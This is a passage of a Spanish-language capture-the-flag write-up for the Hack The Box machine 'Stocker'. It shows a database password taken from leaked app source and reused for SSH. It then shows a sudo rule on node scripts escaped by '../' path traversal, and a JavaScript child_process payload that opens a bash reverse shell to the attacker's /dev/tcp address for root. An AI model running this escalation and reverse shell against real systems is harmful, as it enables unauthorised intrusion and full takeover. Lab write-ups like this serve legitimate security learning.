    <span class="kd">const</span> <span class="nx">products</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nf">model</span><span class="p">(</span><span class="dl">"</span><span class="s2">Product</span><span class="dl">"</span><span class="p">).</span><span class="nf">find</span><span class="p">();</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">(</span><span class="nx">products</span><span class="p">);</span>
<span class="p">});</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/login</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/stock</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">sendFile</span><span class="p">(</span><span class="nx">__dirname</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/templates/login.html</span><span class="dl">"</span><span class="p">);</span>
<span class="p">});</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/login</span><span class="dl">"</span><span class="p">,</span> <span class="k">async </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="p">{</span>
        <span class="nx">username</span><span class="p">,</span>
        <span class="nx">password</span>
    <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">username</span> <span class="o">||</span> <span class="o">!</span><span class="nx">password</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/login?error=login-error</span><span class="dl">"</span><span class="p">);</span>
    <span class="c1">// TODO: Implement hashing</span>
    <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nf">model</span><span class="p">(</span><span class="dl">"</span><span class="s2">User</span><span class="dl">"</span><span class="p">).</span><span class="nf">findOne</span><span class="p">({</span>
        <span class="nx">username</span><span class="p">,</span>
        <span class="nx">password</span>
    <span class="p">});</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/login?error=login-error</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">id</span><span class="p">;</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">);</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/stock</span><span class="dl">"</span><span class="p">);</span>
<span class="p">});</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/order</span><span class="dl">"</span><span class="p">,</span> <span class="k">async </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({});</span>
                <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">basket</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span>
                    <span class="na">success</span><span class="p">:</span> <span class="kc">false</span>
                <span class="p">});</span>
                <span class="kd">const</span> <span class="nx">order</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nf">model</span><span class="p">(</span><span class="dl">"</span><span class="s2">Order</span><span class="dl">"</span><span class="p">)({</span>
                            <span class="na">items</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">basket</span><span class="p">.</span><span class="nf">map</span><span class="p">((</span><span class="nx">item</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">({</span>
                                <span class="na">title</span><span class="p">:</span> <span class="nx">item</span><span class="p">.</span><span class="nx">title</span><span class="p">,</span>
                                <span class="na">price</span><span class="p">:</span> <span class="nx">item</span><span class="p">.</span><span class="nx">price</span><span class="p">,</span>
                                <span class="na">amount</span><span class="p">:</span> <span class="nx">item</span><span class="p">.</span><span class="nx">amount</span>
                            <span class="p">})),</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Si analizamos bien el codigo, logramos ver en la parte superior credenciales de acceso a la base de datos <code class="language-plaintext highlighter-rouge">const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?</code></p>

<p>Tambien tenemos un usuario del sistema llamado “<code class="language-plaintext highlighter-rouge">angoose</code>”</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>root:x:0:0:root:/root:/bin/bash
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
</pre></td></tr></tbody></table></code></div></div>

<p>Probamos las credenciales que encontramos via ssh por el puerto 22 con el usuario angoose</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>ssh angoose@stocker.htb
Password:IHeardPassphrasesArePrettySecure
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>angoose@stocker:~<span class="nv">$ </span>ifconfig
eth0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 10.10.11.196  netmask 255.255.254.0  broadcast 10.10.11.255
        ether 00:50:56:b9:4d:1b  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 148246  bytes 13714635 <span class="o">(</span>13.7 MB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 127921  bytes 19524574 <span class="o">(</span>19.5 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  <span class="o">(</span>Local Loopback<span class="o">)</span>
        RX packets 15696  bytes 2585569 <span class="o">(</span>2.5 MB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 15696  bytes 2585569 <span class="o">(</span>2.5 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

angoose@stocker:~<span class="nv">$ </span><span class="nb">hostname</span> <span class="nt">-I</span>
10.10.11.196
</pre></td></tr></tbody></table></code></div></div>
<p>Bingo!!!! Tenemos una shell por ssh, en esta parte ya podriamos ver la flag de user.txt, ahora solo quedaria enumerar el sistema y escalar privilegios.</p>

<h2 id="enumeracion-del-sistema"><span class="me-2">Enumeracion del Sistema</span><a href="#enumeracion-del-sistema" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="version-de-linux-y-kernel"><span class="me-2">Version de Linux y Kernel</span><a href="#version-de-linux-y-kernel" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>angoose@stocker:~<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
Linux stocker 5.4.0-136-generic <span class="c">#153-Ubuntu SMP Thu Nov 24 15:56:58 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>angoose@stocker:~<span class="nv">$ </span>lsb_release <span class="nt">-a</span>
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.5 LTS
Release:	20.04
Codename:	focal
</pre></td></tr></tbody></table></code></div></div>

<h3 id="sudo"><span class="me-2">SUDO</span><a href="#sudo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Vamos a ver si a nivel de SUDOERS tiene algun permiso para ejecutar algo como root</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>angoose@stocker:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>angoose: 
Matching Defaults entries <span class="k">for </span>angoose on stocker:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User angoose may run the following commands on stocker:
    <span class="o">(</span>ALL<span class="o">)</span> /usr/bin/node /usr/local/scripts/<span class="k">*</span>.js
</pre></td></tr></tbody></table></code></div></div>

<p>Y como dijimos antes vemos que a nivel de sudoers nos deja ejecutar como root la herramienta <code class="language-plaintext highlighter-rouge">node</code> cualquier <em>.js</em> script que se encuentre en esa carpeta, pero jugando un poco con bash podemos bypassear esa entrada y ejecutar codigo malicioso en js</p>

<h2 id="escalada-de-privilegios-rce-javascript"><span class="me-2">Escalada de Privilegios [RCE JAVASCRIPT]</span><a href="#escalada-de-privilegios-rce-javascript" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">sudo</span> /usr/bin/node /usr/local/scripts/../../../../dev/shm/pwned.js
</pre></td></tr></tbody></table></code></div></div>

<p>El problema aquí es que, si bien el administrador claramente quería permitir que angoose solo ejecutara scripts desde ese directorio, * esto indica que cualquier script que se encuentre ahi lo va ejecutar pero no tenemos permisos de escritura para crear un archivo JS malicioso, asi que un ../ nos dejara ejecutar cualquier JS en el sistema de archivos.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">child_process</span><span class="dl">"</span><span class="p">).</span><span class="nf">exec</span><span class="p">(</span><span class="dl">'</span><span class="s1">ping -c 1 10.10.16.2</span><span class="dl">'</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>
<p>Vamos a crear el script que contiene JS malicioso y lo vamos a guardar en <code class="language-plaintext highlighter-rouge">/dev/shm/pwned.js</code></p>

<p>Primero vamos a probar ejecuntando el comando ping a nuestra maquina</p>

<p><a href="/assets/img/htb-writeup-stocker/stocker20.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker20.png" alt="" loading="lazy"></a></p>

<h3 id="shell-como-root"><span class="me-2">Shell como Root</span><a href="#shell-como-root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><code class="language-plaintext highlighter-rouge">require("child_process").exec('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.16.2/443 0&gt;&amp;1"')</code></p>

<p><a href="/assets/img/htb-writeup-stocker/stocker21.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker21.png" alt="" loading="lazy"></a></p>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/htb/">htb</a>,
          <a href="/categories/linux/">linux</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/linux/"
            class="post-tag no-text-decoration"
          >Linux</a>
        
          <a
            href="/tags/fuzz/"
            class="post-tag no-text-decoration"
          >Fuzz</a>
        
          <a
            href="/tags/wfuzz/"
            class="post-tag no-text-decoration"
          >Wfuzz</a>
        
          <a
            href="/tags/lfi/"
            class="post-tag no-text-decoration"
          >LFI</a>
        
          <a
            href="/tags/api/"
            class="post-tag no-text-decoration"
          >API</a>
        
          <a
            href="/tags/curl/"
            class="post-tag no-text-decoration"
          >Curl</a>
        
          <a
            href="/tags/app/"
            class="post-tag no-text-decoration"
          >App</a>
        
          <a
            href="/tags/web/"
            class="post-tag no-text-decoration"
          >Web</a>
        
          <a
            href="/tags/mongo/"
            class="post-tag no-text-decoration"
          >Mongo</a>
        
          <a
            href="/tags/nosql/"
            class="post-tag no-text-decoration"
          >NoSQL</a>
        
          <a
            href="/tags/xss/"
            class="post-tag no-text-decoration"
          >XSS</a>
        
          <a
            href="/tags/javascript/"
            class="post-tag no-text-decoration"
          >Javascript</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/previous/">Previous - Hack The Box</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/conversor/">Conversor - Hack The Box</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/imagery/">Imagery - Hack The Box</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/editorial/">Editorial - Hack The Box</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/runner/">Runner - Hack The Box</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/api/">API</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cve/">CVE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/app/">App</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/code/">Code</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/curl/">Curl</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/docker/">Docker</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/execution/">Execution</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/fuzz/">Fuzz</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    










  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/runner/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1760659200"
  data-df="ll"
  
>
  Oct 17, 2025
</time>

              <h4 class="pt-0 my-2">Runner - Hack The Box</h4>
              <div class="text-muted">
                <p>
                  





                  

Runner es una máquina Linux de dificultad media que contiene una vulnerabilidad [CVE-2023-42793] en TeamCity. Esta vulnerabilidad permite a los usuarios eludir la autenticación y extraer un token...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/editorial/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1761004800"
  data-df="ll"
  
>
  Oct 21, 2025
</time>

              <h4 class="pt-0 my-2">Editorial - Hack The Box</h4>
              <div class="text-muted">
                <p>
                  





                  

Editorial es una máquina Linux de dificultad fácil que cuenta con una aplicación web de publicación vulnerable a Falsificación de Solicitud del Lado del Servidor (SSRF). Esta vulnerabilidad se ap...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/imagery/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1761264000"
  data-df="ll"
  
>
  Oct 24, 2025
</time>

              <h4 class="pt-0 my-2">Imagery - Hack The Box</h4>
              <div class="text-muted">
                <p>
                  





                  

Imagery es una maquina de dificultad Media que al principio del escaneo nos encontramos con una web desarrollada en el lenguaje python werkzeug. Al principio parece una web normal y simple de sub...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Older">
      <p>-</p>
    </div>
  

  
    <a
      href="/posts/runner/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Runner - Hack The Box</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://github.com/MrIncreibl3">MrIncreibl3</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/api/">API</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cve/">CVE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/app/">App</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/code/">Code</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/curl/">Curl</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/docker/">Docker</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/execution/">Execution</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/fuzz/">Fuzz</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->




  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

